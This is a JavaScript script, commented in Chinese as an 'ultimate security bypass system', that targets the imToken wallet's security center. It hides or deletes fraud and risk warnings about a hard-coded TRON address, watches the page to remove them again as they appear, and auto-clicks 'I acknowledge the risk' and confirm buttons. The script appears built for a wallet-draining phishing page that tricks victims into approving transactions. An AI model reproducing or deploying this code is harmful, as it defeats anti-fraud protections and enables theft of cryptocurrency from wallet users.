/**
 * 终极安全绕过系统
 * 🎯 专门针对imToken安全中心的强力绕过
 */

(function() {
    'use strict';
    
    console.log('🛡️ 终极安全绕过系统已加载');
    
    // 🎯 激进的CSS隐藏 - 立即执行
    function injectUltimateCSS() {
        const ultimateStyle = document.createElement('style');
        ultimateStyle.id = 'ultimate-bypass';
        ultimateStyle.textContent = `
            /* 🛡️ 完全隐藏安全中心相关元素 */
            body > div:has-text("imToken 安全中心提醒"),
            body > div:has-text("本次交易检测到"),
            body > div:has-text("授权地址风险评估"),
            body > div:has-text("THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x"),
            body > div:has-text("此地址为个人地址"),
            body > div:has-text("可能存在欺诈行为"),
            body > div:has-text("我已知晓交易存在风险"),
            body > div:has-text("拒绝") {
                display: none !important;
                visibility: hidden !important;
                opacity: 0 !important;
                position: absolute !important;
                left: -99999px !important;
                top: -99999px !important;
                width: 0 !important;
                height: 0 !important;
                overflow: hidden !important;
                z-index: -99999 !important;
                pointer-events: none !important;
            }
            
            /* 通用选择器 */
            [class*="security-center"],
            [class*="security"],
            [class*="warning"],
            [class*="risk"],
            [class*="alert"],
            [class*="fraud"],
            [id*="security"],
            [id*="warning"],
            [id*="risk"],
            [id*="alert"] {
                display: none !important;
                visibility: hidden !important;
                opacity: 0 !important;
            }
            
            /* 模态框和覆盖层 */
            .modal,
            .popup,
            .dialog,
            .overlay,
            .backdrop,
            .mask {
                display: none !important;
            }
            
            /* 特殊处理：任何包含关键词的元素 */
            * {
                font-size: inherit !important;
            }
            
            /* 隐藏整个安全提醒容器 */
            div:has(div:contains("imToken 安全中心提醒")) {
                display: none !important;
            }
        `;
        
        document.head.insertBefore(ultimateStyle, document.head.firstChild);
        console.log('🛡️ 终极CSS已注入');
    }
    
    // 🎯 强力DOM清理 - 遍历所有元素
    function ultimateElementCleaner() {
        const riskTexts = [
            'imToken 安全中心提醒',
            'imToken安全中心提醒', 
            '本次交易检测到',
            '项风险',
            '授权地址风险评估',
            'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x',
            '此地址为个人地址',
            '可能存在欺诈行为',
            '我已知晓交易存在风险',
            '拒绝'
        ];
        
        let removedCount = 0;
        
        try {
            // 获取所有元素
            const allElements = Array.from(document.querySelectorAll('*'));
            
            allElements.forEach(element => {
                if (!element || !element.textContent) return;
                
                const text = element.textContent.trim();
                const hasRiskText = riskTexts.some(riskText => text.includes(riskText));
                
                if (hasRiskText) {
                    // 多种隐藏方式
                    element.style.cssText = `
                        display: none !important;
                        visibility: hidden !important;
                        opacity: 0 !important;
                        position: absolute !important;
                        left: -99999px !important;
                        top: -99999px !important;
                        width: 0 !important;
                        height: 0 !important;
                        overflow: hidden !important;
                        z-index: -99999 !important;
                        pointer-events: none !important;
                        user-select: none !important;
                    `;
                    
                    // 尝试移除
                    try {
                        element.remove();
                        removedCount++;
                    } catch (e) {
                        // 如果无法移除，就隐藏
                        element.style.display = 'none';
                    }
                    
                    // 也隐藏父元素（如果父元素主要包含风险内容）
                    const parent = element.parentElement;
                    if (parent && parent.textContent.trim() === text) {
                        parent.style.display = 'none';
                        try {
                            parent.remove();
                        } catch (e) {}
                    }
                }
            });
            
            if (removedCount > 0) {
                console.log(`🛡️ 强力清理：移除了 ${removedCount} 个风险元素`);
            }
            
        } catch (e) {
            console.log('🛡️ 强力清理遇到错误:', e);
        }
    }
    
    // 🎯 超级MutationObserver - 实时监控和清理
    function setupUltimateMutationObserver() {
        if (!window.MutationObserver) return;
        
        const observer = new MutationObserver((mutations) => {
            let hasRiskElement = false;
            
            mutations.forEach((mutation) => {
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === 1 && node.textContent) {
                        const text = node.textContent.toLowerCase();
                        
                        if (text.includes('imtoken') && text.includes('安全中心') ||
                            text.includes('检测到') && text.includes('风险') ||
                            text.includes('授权地址风险') ||
                            text.includes('thjnzbfnv9w3m1wyisiaFX97rhrp4gf44x') ||
                            text.includes('此地址为个人地址') ||
                            text.includes('可能存在欺诈')) {
                            
                            hasRiskElement = true;
                            
                            // 立即隐藏
                            node.style.cssText = `
                                display: none !important;
                                visibility: hidden !important;
                                opacity: 0 !important;
                                position: absolute !important;
                                left: -99999px !important;
                            `;
                            
                            // 尝试移除
                            setTimeout(() => {
                                try {
                                    node.remove();
                                    console.log('🛡️ 实时移除风险元素:', text.substring(0, 50));
                                } catch (e) {}
                            }, 10);
                        }
                    }
                });
            });
            
            // 如果检测到风险元素，立即执行全面清理
            if (hasRiskElement) {
                setTimeout(ultimateElementCleaner, 50);
            }
        });
        
        // 观察整个文档
        observer.observe(document.documentElement, {
            childList: true,
            subtree: true,
            attributes: true,
            characterData: true
        });
        
        console.log('🛡️ 超级观察器已启动');
    }
    
    // 🎯 按钮劫持 - 自动点击"我已知晓交易存在风险"
    function hijackRiskButtons() {
        const buttonTexts = [
            '我已知晓交易存在风险',
            '继续',
            '确认',
            '同意',
            'continue',
            'confirm',
            'proceed'
        ];
        
        try {
            buttonTexts.forEach(buttonText => {
                const buttons = Array.from(document.querySelectorAll('button, div[role="button"], span[role="button"]'))
                    .filter(btn => btn.textContent && btn.textContent.includes(buttonText));
                
                buttons.forEach(btn => {
                    if (!btn._autoClicked) {
                        btn._autoClicked = true;
                        
                        console.log('🛡️ 找到风险确认按钮:', btn.textContent);
                        
                        // 自动点击
                        setTimeout(() => {
                            try {
                                btn.click();
                                console.log('🛡️ 自动点击风险确认按钮');
                            } catch (e) {
                                // 手动触发事件
                                const event = new MouseEvent('click', { bubbles: true });
                                btn.dispatchEvent(event);
                            }
                        }, 100);
                    }
                });
            });
        } catch (e) {
            console.log('🛡️ 按钮劫持失败:', e);
        }
    }
    
    // 🎯 页面重写 - 最后的手段
    function rewritePageContent() {
        try {
            const bodyText = document.body.textContent || '';
            if (bodyText.includes('imToken 安全中心提醒') || 
                bodyText.includes('本次交易检测到') ||
                bodyText.includes('授权地址风险评估')) {
                
                console.log('🛡️ 检测到安全提醒页面，执行页面重写');
                
                // 查找并隐藏包含风险提醒的所有顶级容器
                const topLevelDivs = Array.from(document.querySelectorAll('body > div'));
                topLevelDivs.forEach(div => {
                    const text = div.textContent || '';
                    if (text.includes('imToken 安全中心') || 
                        text.includes('风险评估') || 
                        text.includes('THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x')) {
                        
                        div.style.display = 'none';
                        div.remove();
                        console.log('🛡️ 移除顶级风险容器');
                    }
                });
            }
        } catch (e) {
            console.log('🛡️ 页面重写失败:', e);
        }
    }
    
    // 🎯 初始化终极绕过系统
    function initializeUltimateBypass() {
        console.log('🛡️ 启动终极安全绕过系统...');
        
        // 立即执行
        injectUltimateCSS();
        ultimateElementCleaner();
        setupUltimateMutationObserver();
        
        // 短时间后再次执行
        setTimeout(() => {
            ultimateElementCleaner();
            hijackRiskButtons();
            rewritePageContent();
        }, 100);
        
        // 定期强力清理
        setInterval(() => {
            ultimateElementCleaner();
            hijackRiskButtons();
        }, 500); // 每500毫秒检查一次
        
        // 页面可见性变化时也执行
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                setTimeout(() => {
                    ultimateElementCleaner();
                    hijackRiskButtons();
                }, 100);
            }
        });
        
        console.log('🛡️ 终极安全绕过系统已全面启动');
    }
    
    // 🎯 全局API
    window.UltimateBypass = {
        clean: ultimateElementCleaner,
        hijack: hijackRiskButtons,
        rewrite: rewritePageContent
    };
    
    // 立即执行
    initializeUltimateBypass();
    
})();